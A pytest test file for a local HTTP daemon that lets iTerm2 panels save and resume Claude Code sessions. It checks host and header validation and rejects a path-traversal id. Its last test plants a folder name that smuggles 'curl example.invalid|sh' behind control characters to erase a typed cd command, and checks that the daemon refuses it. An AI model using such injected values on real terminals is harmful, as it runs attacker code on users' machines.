"""The iTerm2 panels' HTTP API, against a fake iTerm2 app.

Spec: the phase 2 plan. Any web page can reach the port, so every request
needs the exact Host, and a write also needs the panel's X-Panel header,
checked before anything runs. There is no CORS and no framing. Open goes to
the tab already running a session, and otherwise opens a tab named after the
row that types its resume command. The star saves or unsaves the Claude Code
session running in a tab.
"""

import asyncio
import json
import pathlib

import pytest

pytest.importorskip("iterm2")

import missioncache_db  # noqa: E402
from missioncache_db import resume_sessions  # noqa: E402

from missioncache_dashboard.iterm import daemon  # noqa: E402

SID = "aaaaaaaa-1111-4111-8111-111111111111"


class FakeSession:
    def __init__(self) -> None:
        self.sent: list[str] = []
        self.session_id = "w0t9p0"

    async def async_send_text(self, text: str) -> None:
        self.sent.append(text)


class FakeTab:
    def __init__(self) -> None:
        self.current_session = FakeSession()
        self.title = None
        self.activated = False

    async def async_set_title(self, title: str) -> None:
        self.title = title

    async def async_activate(self, order_window_front: bool = False) -> None:
        self.activated = True


class FakeWindow:
    def __init__(self) -> None:
        self.tabs: list[FakeTab] = []

    async def async_create_tab(self) -> FakeTab:
        self.tabs.append(FakeTab())
        return self.tabs[-1]


class FakeApp:
    def __init__(self) -> None:
        self.current_terminal_window = FakeWindow()
        self.sessions = {"w0t0p0": object()}

    def get_session_by_id(self, sid: str):
        return self.sessions.get(sid)


@pytest.fixture
def sandboxed(tmp_path, monkeypatch):
    fake_home = tmp_path / "home"
    (fake_home / ".claude").mkdir(parents=True)
    repo = tmp_path / "repo"
    repo.mkdir()
    monkeypatch.setattr(missioncache_db, "MISSIONCACHE_ROOT", tmp_path / ".missioncache")
    monkeypatch.setattr(missioncache_db, "DB_PATH", tmp_path / "tasks.db")
    monkeypatch.setattr(missioncache_db, "HOOKS_STATE_DB_PATH", fake_home / ".claude" / "hooks-state.db")
    monkeypatch.setattr(pathlib.Path, "home", staticmethod(lambda: fake_home))
    monkeypatch.setattr(resume_sessions, "WINDOWS", False)
    conn = resume_sessions.hook_connect()
    resume_sessions.record_seen(conn, SID, str(repo), None)
    resume_sessions.close_session(conn, SID, "other")
    conn.close()
    monkeypatch.setattr(daemon, "state", {})
    monkeypatch.setattr(daemon, "opening", {})
    monkeypatch.setattr(daemon, "open_lock", asyncio.Lock())
    # call() points these at a free port; this restores them afterwards.
    monkeypatch.setattr(daemon, "PORT", daemon.PORT)
    monkeypatch.setattr(daemon, "HOST", daemon.HOST)
    focused: list = []

    async def focus(session) -> None:
        focused.append(session)

    monkeypatch.setattr(daemon, "focus", focus)
    return {"repo": repo, "focused": focused, "app": FakeApp()}


def _row(list_name: str = "all") -> dict:
    [row] = daemon.with_db(lambda conn: resume_sessions.list_sessions(conn, list_name, None))
    return row


def call(app, method: str, path: str, *, host: str | None = None,
         panel: bool = True, body: dict | None = None) -> tuple[int, dict, bytes]:
    """One request to a server started for it on a free port."""

    async def go():
        server = await asyncio.start_server(lambda r, w: None, "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        server.close()
        await server.wait_closed()
        daemon.PORT, daemon.HOST = port, f"127.0.0.1:{port}"
        server = await daemon.serve(None, app)
        try:
            reader, writer = await asyncio.open_connection("127.0.0.1", port)
            raw = json.dumps(body).encode() if body is not None else b""
            head = [f"{method} {path} HTTP/1.1", f"Host: {host or daemon.HOST}",
                    f"Content-Length: {len(raw)}"]
            if panel:
                head.append("X-Panel: 1")
            writer.write(("\r\n".join(head) + "\r\n\r\n").encode() + raw)
            await writer.drain()
            response = await reader.read()
            writer.close()
        finally:
            server.close()
            await server.wait_closed()
        head, _, payload = response.partition(b"\r\n\r\n")
        lines = head.decode().split("\r\n")
        headers = dict(line.split(": ", 1) for line in lines[1:])
        return int(lines[0].split()[1]), headers, payload

    return asyncio.run(go())


def test_a_foreign_host_is_refused(sandboxed):
    status, _, _ = call(sandboxed["app"], "GET", "/resume?list=all", host="evil.example:8791")
    assert status == 403


def test_a_write_without_the_panel_header_does_nothing(sandboxed):
    status, _, _ = call(sandboxed["app"], "POST", f"/resume/{SID}/keep", panel=False)
    assert status == 403
    assert _row()["list"] == "closed"


def test_no_cors_and_no_framing(sandboxed):
    status, headers, _ = call(sandboxed["app"], "GET", "/resume?list=all")
    assert status == 200
    assert "Access-Control-Allow-Origin" not in headers
    assert headers["X-Frame-Options"] == "DENY"


def test_keep_and_unsave(sandboxed):
    assert call(sandboxed["app"], "POST", f"/resume/{SID}/keep")[0] == 200
    assert _row()["list"] == "saved"
    assert call(sandboxed["app"], "POST", f"/resume/{SID}/unsave")[0] == 200
    assert _row()["list"] == "closed"


def test_a_malformed_id_is_refused(sandboxed):
    status, _, body = call(sandboxed["app"], "POST", "/resume/..%2F..%2Fx/keep")
    assert (status, body) == (400, b"not a session id")


def test_open_types_the_resume_command_in_a_named_tab(sandboxed):
    status, _, _ = call(sandboxed["app"], "POST", f"/resume/{SID}/open")
    assert status == 200
    [tab] = sandboxed["app"].current_terminal_window.tabs
    row = _row()
    assert tab.title == row["name"] == "repo"
    assert tab.current_session.sent == [f"cd {sandboxed['repo']} && claude --resume {SID}\n"]
    assert tab.activated


def test_open_goes_to_the_tab_already_running_it(sandboxed):
    daemon.state["w0t0p0"] = {"claude": SID}
    status, _, _ = call(sandboxed["app"], "POST", f"/resume/{SID}/open")
    assert status == 200
    assert sandboxed["focused"] == [sandboxed["app"].sessions["w0t0p0"]]
    assert sandboxed["app"].current_terminal_window.tabs == []


def test_open_refuses_a_missing_directory(sandboxed):
    sandboxed["repo"].rmdir()
    status, _, body = call(sandboxed["app"], "POST", f"/resume/{SID}/open")
    assert status == 400
    assert b"does not exist" in body
    assert sandboxed["app"].current_terminal_window.tabs == []


def test_the_star_saves_the_session_in_that_tab(sandboxed):
    daemon.state["w0t0p0"] = {"claude": SID}
    assert call(sandboxed["app"], "POST", "/live/w0t0p0/save")[0] == 200
    assert _row()["list"] == "saved"
    assert call(sandboxed["app"], "POST", "/live/w0t0p0/unsave")[0] == 200
    assert _row()["list"] == "closed"


def test_the_star_on_a_tab_without_claude_is_refused(sandboxed):
    status, _, body = call(sandboxed["app"], "POST", "/live/w9t9p9/save")
    assert (status, body) == (400, b"no Claude Code session in that tab")
    assert _row()["list"] == "closed"


def test_two_opens_at_once_resume_the_session_once(sandboxed):
    """Two clicks before Claude Code shows up in the new tab: the second goes
    to the tab the first opened, so one transcript never gets two writers."""
    app = sandboxed["app"]
    created: list = []
    real_create = app.current_terminal_window.async_create_tab

    async def create_tab():
        tab = await real_create()
        tab.current_session.session_id = f"w0t{len(created) + 1}p0"
        app.sessions[tab.current_session.session_id] = tab.current_session
        created.append(tab)
        await asyncio.sleep(0.05)  # iTerm2 takes a moment, the second click lands here
        return tab

    app.current_terminal_window.async_create_tab = create_tab

    async def both():
        await asyncio.gather(daemon.open_row(None, app, SID), daemon.open_row(None, app, SID))

    asyncio.run(both())
    assert len(created) == 1
    assert sum(len(t.current_session.sent) for t in created) == 1
    assert sandboxed["focused"] == [created[0].current_session]


def test_no_tab_for_a_folder_with_a_control_character(sandboxed):
    # A Ctrl+U and a carriage return in the folder name would erase the cd
    # and run the rest of the name. Such a row has no command to type.
    hostile = sandboxed["repo"].parent / "a\x15curl example.invalid|sh\r"
    hostile.mkdir()  # it exists, so only the control-character rule stops it
    conn = resume_sessions.hook_connect()
    conn.execute("UPDATE resume_sessions SET cwd = ? WHERE session_id = ?", (str(hostile), SID))
    conn.commit()
    conn.close()
    status, _, body = call(sandboxed["app"], "POST", f"/resume/{SID}/open")
    assert status == 400
    assert sandboxed["app"].current_terminal_window.tabs == []
